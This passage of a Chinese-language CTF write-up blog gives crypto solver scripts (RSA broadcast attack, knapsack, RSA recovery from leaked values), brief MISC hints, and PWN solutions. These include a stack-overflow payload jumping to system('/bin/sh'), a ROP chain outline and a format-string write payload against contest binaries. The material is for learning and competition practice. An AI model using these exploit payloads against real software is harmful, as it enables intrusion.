mpz(0xe096219878f492bcdb2a2d03995521e7a65125733bae18e7d0005e35343fea3653698de60231d29b2d1b44a0b4ffd3183855b9042275f769e1702fa8843062df0938821db0258af40ab3cda8e54eb6ac826d545df91dfe76266cb01b1d6fad39e6ef13ce730c1c2395136b0bbdf22c6b0daba63701d71c6ae70d4e06935b9941),\n&#39;c&#39; : mpz(0xff24bddc5a7b327535af92dba58c5d62a22d542e6ba1df6f91c98c7563d8e48e770fb623bfcc2f09ed49788293306ff709670b225da32ea134422d5e403b11c39ef6b144f96b2fe94b3aa136432ecea86a4069a4cb0b4d8570edb3fb5bb2cf0693184ef0c589887b012ebe6ea94e854a71a7eb768133d15e784e388976877db)&#125;,\n&#123;&#39;n&#39; : mpz(0xa36b15a395edf3e99927f658e22d5f4aefd83434972c96cca5242a1aaa517ad83739451269723092dd9e73c00682dd3bbd74a985546def88196119b6d57b397283bc7b8b6029916df84284bec1725f6e5d3d29042af685c508a58ab6fb4e5bfeb326ae49330e3f4426abc1860ca4412feb976ee571075a47b854c9a6f5f0ebff),\n&#39;c&#39; : mpz(0x895f8283e2200bab1bf938ce3b5e42147b53a5178e436ea0b64a2380ba99776d5ba8046ef722858b20d9650ee68c09e905030f1634e0b32397b7b12236a5a301e5923a294ef1bdf16458f4fc8677370ce2ce3d0fd957da7466e5b104191d454455917147f3187b758c1c468db1b35514391e5b36bd1ac39e91bbb24fdbc07872)&#125;,\n&#123;&#39;n&#39; : mpz(0x9d4732db2539d1166dc6865670be11951bf49295bc8c472f34682a0fb7f2b3ba96dcfa1945c2e4685dfeae5255abe2ab3b7fb2282971bb16ce02d14082f71755e8a65c956e114336914a409a9f1158fb362a92c4e169fa3c460ea26fb5c6693447b14f1c3156a2d9308dd993d7ea708a00ad149fb77109d8a5f77de1703ba249),\n&#39;c&#39; : mpz(0x3bead3d6760bff4de22562978d4722bb21ee4792ebdb32703b6df9ff5176e033e97ad8fc81467f4b3df7bd4e8bcae09462f3eca93a3da1cd9d7e8de3e464471fdd0b70112c1c738b0daa2a37a65331eaa8954b81b410f62a0280da32eb3e305782d5f774d814ca0adb13344687387cf72657dc21724bcf69da810d7635b99467)&#125;\n]\n\nN &#x3D; mpz(1)\nfor i in range(3):\n    N *&#x3D; question[i][&#39;n&#39;]\n\nms &#x3D; [question[1][&#39;n&#39;]*question[2][&#39;n&#39;], question[0][&#39;n&#39;]*question[2][&#39;n&#39;], question[0][&#39;n&#39;]*question[1][&#39;n&#39;]]\n\na &#x3D; mpz(0)\nfor i in range(3):\n    n &#x3D; question[i][&#39;n&#39;]\n\n    m &#x3D; mpz(N &#x2F;&#x2F; n)\n    # m &#x3D; ms[i]\n\n    mi &#x3D; invert(m, n)\n    a &#x3D; (a + question[i][&#39;c&#39;] * m * mi) % N\n\nm &#x3D; iroot(a, 3)[0]\n\nprint(libnum.n2s(int(m)))</code></pre>\n\n<h3 id=\"跳跃的指尖\"><a href=\"#跳跃的指尖\" class=\"headerlink\" title=\"跳跃的指尖\"></a>跳跃的指尖</h3><h4 id=\"简介-5\"><a href=\"#简介-5\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>wdr qsz awdx thu xdv eft thu ol rgy ilp(注意请将请将答案套上SYC{}提交)</p>\n<h4 id=\"解题-6\"><a href=\"#解题-6\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>键盘上字母围着的就是flag</p>\n<h3 id=\"Strange-code\"><a href=\"#Strange-code\" class=\"headerlink\" title=\"Strange code\"></a>Strange code</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点：<br>01背包，Knapsack</p></blockquote>\n<h4 id=\"简介-6\"><a href=\"#简介-6\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>I will mount a long wind some day and break the heavy waves And set my cloudy sail straight and bridge the deep, deep sea.</p>\n<p>说实话，我看不懂简介</p>\n<h4 id=\"提示-5\"><a href=\"#提示-5\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>1.Knapsack 2.flag格式为<code>SYC&#123;(secret_string)&#125;</code></p>\n<h4 id=\"加密流程\"><a href=\"#加密流程\" class=\"headerlink\" title=\"加密流程\"></a>加密流程</h4><h4 id=\"生成公钥\"><a href=\"#生成公钥\" class=\"headerlink\" title=\"生成公钥\"></a>生成公钥</h4><p>a是私钥，b是公钥</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a &#x3D; [...] # 超递增序列\n### m &gt; sum(s)\nw &#x3D; getPrime(n)\nb &#x3D; [a[i]*w % m for i in range(n)]</code></pre>\n\n<h4 id=\"加密\"><a href=\"#加密\" class=\"headerlink\" title=\"加密\"></a>加密</h4><p>先将原文转换成int，再转换成二进制格式的字符串</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">mes &#x3D; [int(i, 2) for i in bin(bytes_to_long(bytes(mes, encoding&#x3D;&#39;utf-8&#39;)))[2:].rjust(64, &#39;0&#39;)]\nc &#x3D; 0\nfor i in range(n)\n\tc +&#x3D; (b[i]*mes[i]) % m</code></pre>\n\n<h4 id=\"解密\"><a href=\"#解密\" class=\"headerlink\" title=\"解密\"></a>解密</h4><p>推导过程见下面python代码片段</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">w_i &#x3D; gp.invert(w, m)\n\nc &#x3D; sum(b[i]*mes[i] % m) &#x3D; sum(a[i]*w*mes[i] % m)\nc*w_i &#x3D; sum(w_i*a[i]*w*mes[i] % m) &#x3D; sum(a[i]*mes[i] % m)\n\n### m &gt; sum(s)\nb[i]*w_i &#x3D; s[i]*w*w_i % m &#x3D; s[i] % m &#x3D; s[i]</code></pre>\n\n<h4 id=\"解题脚本\"><a href=\"#解题脚本\" class=\"headerlink\" title=\"解题脚本\"></a>解题脚本</h4><pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">from gmpy2 import *\nfrom Crypto.Util.number import long_to_bytes\n\nenc &#x3D; 4650243845163898051650\nbs &#x3D; data[:]\nw &#x3D; 10609877878708146473\nm &#x3D; 253851571337947929263\n\nw_i &#x3D; invert(w, m)\n\na &#x3D; [(w_i * b) % m for b in bs]\n\nav &#x3D; enc*w_i % m\n\nm &#x3D; &#39;&#39;\nfor i_i in range(64):\n    i &#x3D; 63 - i_i\n    if av &gt;&#x3D; a[i]:\n        m +&#x3D; &#39;1&#39;\n        av -&#x3D; a[i]\n    else:\n        m +&#x3D; &#39;0&#39;\n\nprint(av)\nm &#x3D; m[::-1]\nprint(len(m), m)\nm &#x3D; int(m, 2)\nprint(long_to_bytes(m))</code></pre>\n\n<h3 id=\"funny-rsa\"><a href=\"#funny-rsa\" class=\"headerlink\" title=\"funny rsa\"></a>funny rsa</h3><p>第一个脚本，解hint，包含验算部分</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import gmpy2 as gp\nfrom Crypto.Util.number import long_to_bytes\n\nc &#x3D; 167991288045303000655678332469702456156006927056795988184486782639594811154157430883888171768898616013017469226146528316669411009693161813068877601341794154799154579698061130344409936572057393406182997791983691902804474594459551816221476117792337686268697787228149355295256968844786104832801764130261045846806268887759441150366851268084155967124558636130241419050274900078069517490749660442582935909745378880450868778768818202112172222446341661337699089743565266\ne &#x3D; 0x10001\nn &#x3D; 1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258287506501285068163017195211966134698458111181058182005585938681465830111118867709096243399041372276386809721333892464112085735367452600541715292290079220522270815111077388426606567096816463177229069700881806969035414147663217609196771833717652147248133905228806566277089964340350926709132880091484440081291867\nphi &#x3D; 1141574900469012067636252180723835763151920736282470632700965427450254174708499891391924201142298374181693031433288816864153023177804715482450166860015258165887575210803576766535149248650990306655744681050265422300794686668511098707335740896061248758188315389043730123141479632359506080499922725994127962549611715479724233268459284756489870354300620746588895051518136083710196648747569108450588260775600203396574920477102242310852948444452793222038768500472297680\n\nd &#x3D; gp.invert(e, phi)\nprint(&#39;d&#39;, d)\nm &#x3D; pow(c, d, n)\nprint(&#39;m&#39;, m)\nprint(long_to_bytes(m))\n\nn &#x3D; pq\n### phi &#x3D; (p-1)(q-1)\n### n - phi + 1 &#x3D; p+q\n\n### test\n\nP &#x3D; 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657\nQ &#x3D; 9386490551412435844811502505319278002577937841221881957073276159551090488386896450977177594453235429471397541114726559808406428210587601020931333624410531\n\nN &#x3D; P*Q\nPHI &#x3D; (P-1)*(Q-1)\nE &#x3D; 0x10001\nD &#x3D; gp.invert(E, PHI)\nC &#x3D; pow(m, E, N)\nprint(C &#x3D;&#x3D; c)\nM &#x3D; pow(c, D, N)\nprint(long_to_bytes(M))</code></pre>\n\n<p>第二个脚本，解flag</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">import gmpy2 as gp\nfrom Crypto.Util.number import long_to_bytes\nfrom sympy import prevprime, nextprime\n\n### know\nc &#x3D; 29481634166275444081755526650435050746177271929108540340839636645290382212801883156176249297905065394477723980727035074018048212479803055923507504121830977544547768817541693745091881774043457256431594076739380675412845360130106309932588508902347792967474645133565825400509525159035854284711152310367992325935\ndp &#x3D; 8488018598582161778909675874955311952104108410770019733352933135643797561752804534164335792268466126138022884715691928735179876112592458061466852929011221\ndq &#x3D; 1804557936862041610503694621208928380602760766763762174784442626117998593478392526552839638322965598840334590533505416988939157674783742124641579057347585\ne &#x3D; 0x10001\n### from s2.py\nP &#x3D; 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583657\n### known\nphi1 &#x3D; 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984580709\nphi2 &#x3D; 14791163179457434444794516008567747647481303154854379011669786795227420724280194789275852623687083215283362389785521435675635086985421541180045676277059133761026503234930139783585424177770093774298344633019455696732427486555045266582452534884374013066166218727210717017471654996534132389375716815039737309422629330481627790753048488473591834571187285222137701096156433851572403219503404745764359756858453750475644478848507148119634603762692031495081180813557541978095885608362527785904217182231158501737362821598389883245856723022310689702037117899117551792218810829198381549179717721512988616131869821769062534942681\np &#x3D; 11028097119370348846286892427281754875005887017101518244017905295402394052666300915021769057886254797761936596400069424953758446151837197652241250156786179\nq &#x3D; 11028097119370348846286892427281754875005887017101518244017905295402394052666300915021769057886254797761936596400069424953758446151837197652241250156787457\nn &#x3D; 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670923225039074172381815084092956190340624042159304967909981861864868720266478573368762195751892967204674706361740860259943586512946349426452336267106298156803\nphi &#x3D; 121618926074264586250660062717483708151455436377131740163637886779161600020160373355347337792614088071420677603769322632453375861372100618989298162116670901168844835431684122510308101626830874030385270764873493826054277915478373240766932152213777194695079182488548060121093678996054045752057031784605984583168\nd &#x3D; 4435192842478178145766171016292873681767222987645831499627608059602914751181520245346600200258596983241457794421604301258274994410475311341447161259423584445329190482959626665847328423457372002572909915437808417295111528113787815210231897154140828773383573342503164070516103770397930472060306482829673362433\nm &#x3D; 9651118480623774404727104938043947709060758201052623399972630017760852142422397\n\nphi1 &#x3D; prevprime(P)\nprint(&#39;phi1 &#x3D;&#39;, phi1)\n\ndef f1b():\n    i_phi1 &#x3D; gp.iroot(phi1, 2)[0]\n\n    p2 &#x3D; prevprime(i_phi1)\n    p1 &#x3D; prevprime(p2)\n    phi_ &#x3D; (p1-1)*(p2-1)\n    d1 &#x3D; gp.invert(e, phi_)\n\n    while((dp+dq) !&#x3D; ((d1%(p1-1)) + (d1%(p2-1)))):\n        less, great &#x3D; phi_ &lt; P, phi_ &gt; phi1\n        print(&#39;f&#39;, &#39;less&#39;, less, &#39;great&#39;, great, &#39;\\n&#39;)\n    \n        if not less:\n            break\n\n        p1, p2 &#x3D; p2, nextprime(p2)\n        phi_ &#x3D; (p1-1)*(p2-1)\n        d1 &#x3D; gp.invert(e, phi_)\n    else:\n        print(&#39;got&#39;)\n        print(m)\n        print(long_to_bytes(pow(c, d1, p1*p2)))\n\n\nf1b()</code></pre>\n\n<h2 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h2><h3 id=\"一叶障目\"><a href=\"#一叶障目\" class=\"headerlink\" title=\"一叶障目\"></a>一叶障目</h3><p>ps即可</p>\n<h3 id=\"壮言壮语\"><a href=\"#壮言壮语\" class=\"headerlink\" title=\"壮言壮语\"></a>壮言壮语</h3><p>与佛论禅</p>\n<h3 id=\"秘技·反复横跳\"><a href=\"#秘技·反复横跳\" class=\"headerlink\" title=\"秘技·反复横跳\"></a>秘技·反复横跳</h3><p>用软件一分就行了</p>\n<h3 id=\"来拼图\"><a href=\"#来拼图\" class=\"headerlink\" title=\"来拼图\"></a>来拼图</h3><p>手动筛选有字的块<br>然后ppt拼图</p>\n<h3 id=\"飞翔的刘壮\"><a href=\"#飞翔的刘壮\" class=\"headerlink\" title=\"飞翔的刘壮\"></a>飞翔的刘壮</h3><p>十分的时候死就行了</p>\n<h3 id=\"吉普赛的歌姬\"><a href=\"#吉普赛的歌姬\" class=\"headerlink\" title=\"吉普赛的歌姬\"></a>吉普赛的歌姬</h3><p>qq里面有名字生日，dddd</p>\n<h2 id=\"PWN\"><a href=\"#PWN\" class=\"headerlink\" title=\"PWN\"></a>PWN</h2><h3 id=\"数学咋样\"><a href=\"#数学咋样\" class=\"headerlink\" title=\"数学咋样?\"></a>数学咋样?</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点<br>使用pwntools通信<br>(vm虚拟机使用, 及linux安装)</p></blockquote>\n<h4 id=\"简介-7\"><a href=\"#简介-7\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>不会吧， 不会吧，不会有人上了大学, 连加法都做不来吧？ 题目端口： nc 81.69.0.47 1111</p>\n<h4 id=\"提示-6\"><a href=\"#提示-6\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p><a href=\"https://xz.aliyun.com/t/3944\">https://xz.aliyun.com/t/3944</a><br><a href=\"http://docs.pwntools.com/en/stable/index.html\">http://docs.pwntools.com/en/stable/index.html</a><br><a href=\"https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html\">https://www.vmware.com/products/workstation-pro/workstation-pro-evaluation.html</a><br><a href=\"https://ubuntu.com/download\">https://ubuntu.com/download</a></p>\n<h4 id=\"解题-7\"><a href=\"#解题-7\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>关于安装pwntools, 这里建议使用ubuntu18年版本, 20版本可能会因部分包版本过高导致pwntools安装失败<br>然后通信发现这就是很简单的接受消息, 消息包含两个数字，加起来发回去, 这个过程重复20次<br>所以写脚本自动发送<br>关键代码如下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\">a &#x3D; conn.recvline(timeout&#x3D;1)\n### b&#39;![0]  num_1 &#x3D; 713, num_2 &#x3D; 137\\n&#39;\ns &#x3D; str(a, encoding&#x3D;&#39;utf-8&#39;)\ns &#x3D; s.split(&#39; &#39;)\ns &#x3D; str(int(s[4][:-1])+int(s[7][:-1]))\nconn.sendline(s)</code></pre>\n\n<p>循环20次得到SYC{O==[]=====&gt;l1u_zhu@ng}</p>\n<h3 id=\"liuzhuang-secret\"><a href=\"#liuzhuang-secret\" class=\"headerlink\" title=\"liuzhuang-secret\"></a>liuzhuang-secret</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>栈溢出原理, ROP, 64位寄存器传参</p></blockquote>\n<h4 id=\"简介-8\"><a href=\"#简介-8\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>题目端口： nc 81.69.0.47 1000</p>\n<h4 id=\"提示-7\"><a href=\"#提示-7\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>铁汁们，了解过rop技术么<br><a href=\"http://www.vuln.cn/6642\">http://www.vuln.cn/6642</a><br><a href=\"https://github.com/pwndbg/pwndbg\">https://github.com/pwndbg/pwndbg</a><br><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/\">https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/</a></p>\n<h4 id=\"解题-8\"><a href=\"#解题-8\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>首先检查，程序是64位<br>使用ida分析提供的程序<br>main函数中有一行存在栈溢出的代码</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">gets(&amp;v4, 0LL);</code></pre>\n\n<h4 id=\"确认覆盖地址\"><a href=\"#确认覆盖地址\" class=\"headerlink\" title=\"确认覆盖地址\"></a>确认覆盖地址</h4><p>首先确定需要覆盖的地址<br>使用cyclic得到是120个字</p>\n<h4 id=\"搜集组件\"><a href=\"#搜集组件\" class=\"headerlink\" title=\"搜集组件\"></a>搜集组件</h4><p>然后在ida中搜system找到system起始位置<br>使用交叉引用找到sub_40076b调用了system<br>发现程序直接调用system(‘/bin/sh’)<br>既然如此, 直接跳转到该地址即可<br>payload = ‘A’ * 120 + target_addr</p>\n<p>cat flag得到SYC{0H_you_b3come_A_PWNer}</p>\n<h4 id=\"更复杂的解法-构造ROP链\"><a href=\"#更复杂的解法-构造ROP链\" class=\"headerlink\" title=\"更复杂的解法: 构造ROP链\"></a>更复杂的解法: 构造ROP链</h4><p>payload = padding + pop_rdi + binsh_addr + system_addr</p>\n<h3 id=\"fmt\"><a href=\"#fmt\" class=\"headerlink\" title=\"fmt\"></a>fmt</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>知识点:<br>格式化字符串漏洞</p></blockquote>\n<h4 id=\"简介-9\"><a href=\"#简介-9\" class=\"headerlink\" title=\"简介\"></a>简介</h4><p>题目地址： nc 81.69.0.47 2222</p>\n<h4 id=\"提示-8\"><a href=\"#提示-8\" class=\"headerlink\" title=\"提示\"></a>提示</h4><p>格式化字符串漏洞！<br><a href=\"https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/\">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/fmtstr/fmtstr_intro-zh/</a></p>\n<h4 id=\"解题-9\"><a href=\"#解题-9\" class=\"headerlink\" title=\"解题\"></a>解题</h4><p>提供一个64位程序<br>ida分析发现一个格式化字符串漏洞</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">read(0, &amp;buf, 0x30uLL);\nprintf(&amp;buf, &amp;buf);</code></pre>\n\n<p>程序逻辑</p>\n<pre class=\"line-numbers language-c\" data-language=\"c\"><code class=\"language-c\">seed &#x3D; time()\n&#x2F;&#x2F; 格式化字符串漏洞\nsrand(seed)\nfor (i&#x3D;0; i&lt;16; i++)\n\t&#x2F;&#x2F; 输入需等于rand()</code></pre>\n\n<p>解题思路是通过漏洞把seed变成固定值, 写一个c程序预测随机数结果, 然后输入</p>\n<p>首先通过payload = ‘aa%d.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p’<br>得到字符串起始位置在第7个参数的位置, 所以把seed_addr放到第八个参数的位置<br>payload = b’a’ + b’%0d%8$n’ + p64(seed_addr)</p>\n<p>seed_addr地址通过gdb调试可以找到</p>\n<h4 id=\"解法2\"><a href=\"#解法2\" class=\"headerlink\" title=\"解法2\"></a>解法2</h4><p>暴露seed的值, 然后根据这个值预测随机数</p>\n<h3 id=\"runcode\"><a href=\"#runcode\" class=\"headerlink\" title=\"runcode\"></a>runcode</h3><h4 id=\"非期望解\"><a href=\"#非期望解\" class=\"headerlink\" title=\"非期望解\"></a>非期望解</h4><p>直接使用c语言文件输入输出</p>\n<h3 id=\"baby-canary\"><a href=\"#baby-canary\" class=\"headerlink\" title=\"baby_canary\"></a>baby_canary</h3><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 